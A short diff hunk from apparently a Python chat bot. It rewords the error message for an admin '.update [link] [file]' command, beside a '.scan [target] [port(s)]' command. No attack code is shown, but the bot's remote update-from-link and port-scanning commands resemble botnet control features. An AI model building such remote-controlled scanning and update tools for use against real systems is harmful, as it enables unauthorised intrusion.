@@ -594,7 +594,7 @@ def main():
                         target = target.split(' ')[0]
                         update(target, uFile)
                     else:
-                        message = "Failed to update!"
+                        message = "Could not parse. The command should be in the format of '.update [link] [file]' to work properly."
                     sendntc(message, adminname)
                                
                 # Respond to '.scan [target] [port(s)]' command from admin.
